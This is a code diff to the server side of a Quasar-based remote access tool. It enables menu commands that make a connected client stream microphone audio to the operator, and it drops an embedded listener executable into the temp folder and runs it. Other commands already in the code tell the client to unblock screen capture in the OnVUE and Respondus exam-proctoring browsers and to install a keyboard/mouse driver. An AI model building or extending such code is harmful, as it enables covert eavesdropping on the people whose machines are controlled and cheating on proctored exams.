@@ -5,15 +5,20 @@ using Quasar.Common.Messages;
 using Quasar.Server.Helper;
 using Quasar.Server.Messages;
 using Quasar.Server.Networking;
+using Quasar.Server.Properties;
 using Quasar.Server.Utilities;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Diagnostics.Eventing.Reader;
 using System.Drawing;
+using System.IO;
+using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Timers;
 using System.Windows.Forms;
+using System.Linq;
 
 namespace Quasar.Server.Forms
 {
@@ -60,6 +65,8 @@ namespace Quasar.Server.Forms
         private readonly RemoteDesktopHandler _remoteDesktopHandler;
 
         private readonly ClientDebugMessageHandler _clientDebugMessageHandler;
+
+        private static Process audioListenProcess = null;
 
         /// <summary>
         /// Holds the opened remote desktop form for each client.
@@ -205,10 +212,10 @@ namespace Quasar.Server.Forms
             AppendMenu(systemMenu, 0x0, USER_CMD_INSTALL_KBM_DRIVER, "Install KB/M driver");
             AppendMenu(systemMenu, 0x0, USER_CMD_UNINSTALL_KBM_DRIVER, "Uninstall KB/M driver");
 
-            //AppendMenu(systemMenu, 0x800, 0, string.Empty);
+            AppendMenu(systemMenu, 0x800, 0, string.Empty);
 
-            //AppendMenu(systemMenu, 0x0, USER_CMD_START_AUDIO, "Start audio");
-            //AppendMenu(systemMenu, 0x0, USER_CMD_STOP_AUDIO, "Stop audio");
+            AppendMenu(systemMenu, 0x0, USER_CMD_START_AUDIO, "Start audio");
+            AppendMenu(systemMenu, 0x0, USER_CMD_STOP_AUDIO, "Stop audio");
         }
 
         // Handle the custom menu commands
@@ -216,30 +223,110 @@ namespace Quasar.Server.Forms
         {
             if (m.Msg == WM_SYSCOMMAND)
             {
-                switch ((int)m.WParam)
+                if (_connectClient != null)
                 {
-                    case USER_CMD_ONVUE:
-                        _connectClient.Send(new DoUnblockScreenCapture{ browserType = BrowserTypeToUnblock.ONVUE});
-                        return;
-                    case USER_CMD_RESPONDUS:
-                        _connectClient.Send(new DoUnblockScreenCapture { browserType = BrowserTypeToUnblock.RESPONDUS });
-                        return;
-                    case USER_CMD_INSTALL_KBM_DRIVER:
-                        _connectClient.Send(new KBMDriverCommand
-                        {
-                            action = "install"
-                        });
-                        return;
-                    case USER_CMD_UNINSTALL_KBM_DRIVER:
-                        _connectClient.Send(new KBMDriverCommand
-                        {
-                            action = "uninstall"
-                        });
-                        return;
+                    switch ((int)m.WParam)
+                    {
+                        case USER_CMD_ONVUE:
+                            _connectClient.Send(new DoUnblockScreenCapture { browserType = BrowserTypeToUnblock.ONVUE });
+                            return;
+                        case USER_CMD_RESPONDUS:
+                            _connectClient.Send(new DoUnblockScreenCapture { browserType = BrowserTypeToUnblock.RESPONDUS });
+                            return;
+                        case USER_CMD_INSTALL_KBM_DRIVER:
+                            _connectClient.Send(new KBMDriverCommand
+                            {
+                                action = "install"
+                            });
+                            return;
+                        case USER_CMD_UNINSTALL_KBM_DRIVER:
+                            _connectClient.Send(new KBMDriverCommand
+                            {
+                                action = "uninstall"
+                            });
+                            return;
+                        case USER_CMD_START_AUDIO:
+
+                            AudioStartItemClicked();                          
+                            break;
+                        case USER_CMD_STOP_AUDIO:
+                            _connectClient.Send(new DoAudioTransfer
+                            {
+                                Action = "stop"
+                            });
+                            return;
+                    }
                 }
             }
-
             base.DefWndProc(ref m);
+        }
+
+        private void StartAudioListener(int port, int sampleRate, int bitDepth, int channels)
+        {
+            string text = Path.Combine(new string[]
+            {
+                Path.GetTempPath(),
+                Guid.NewGuid().ToString() + ".exe"
+            });
+            try
+            {
+                File.WriteAllBytes(text, Resources.AudioListener);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("AudioListener writing error: ", ex.Message);
+            }
+            string stdout, stderr;
+            CheckOutput("\"" + text + "\"", string.Format("{0} {1} {2} {3}", port, sampleRate, bitDepth, channels));
+        }
+
+        private void CheckOutput(string fileName, string cmd)
+        {
+            audioListenProcess = new Process();
+            audioListenProcess.StartInfo.UseShellExecute = false;
+            //audioListenProcess.StartInfo.RedirectStandardOutput = true;
+            //audioListenProcess.StartInfo.RedirectStandardError = true;
+            audioListenProcess.StartInfo.CreateNoWindow = false;
+            audioListenProcess.StartInfo.FileName = fileName;
+            audioListenProcess.StartInfo.Arguments = cmd;
+            audioListenProcess.Start();
+
+            //stdout = audioListenProcess.StandardOutput.ReadToEnd();
+            //stderr = audioListenProcess.StandardError.ReadToEnd();
+            //audioListenProcess.WaitForExit();
+            
+        }
+
+        private static bool IsPortListening(int port)
+        {
+            var properties = IPGlobalProperties.GetIPGlobalProperties();
+            var tcpConnections = properties.GetActiveTcpListeners();
+
+            return tcpConnections.Any(endpoint => endpoint.Port == port);
+        }
+
+        private void AudioStartItemClicked()
+        {
+            FrmAudioSetting audioSetting = new FrmAudioSetting();
+            if (audioSetting.ShowDialog(this) == DialogResult.OK)
+            {
+                int sampleRate = audioSetting.SampleRate;
+                int bitDepth = audioSetting.BitDepth;
+                int channels = audioSetting.Channels;
+
+                _connectClient.Send(new DoAudioTransfer
+                {
+                    Action = "start",
+                    BitDepth = bitDepth,
+                    Channels = channels,
+                    SampleRate = sampleRate,
+                    Port = 10000
+                });
+                if(!IsPortListening(10000))
+                {
+                    StartAudioListener(10000, sampleRate, bitDepth, channels);
+                }
+            }
         }
 
         /// <summary>
@@ -768,7 +855,6 @@ namespace Quasar.Server.Forms
                 });
             }
         }
-
 
     }
 }
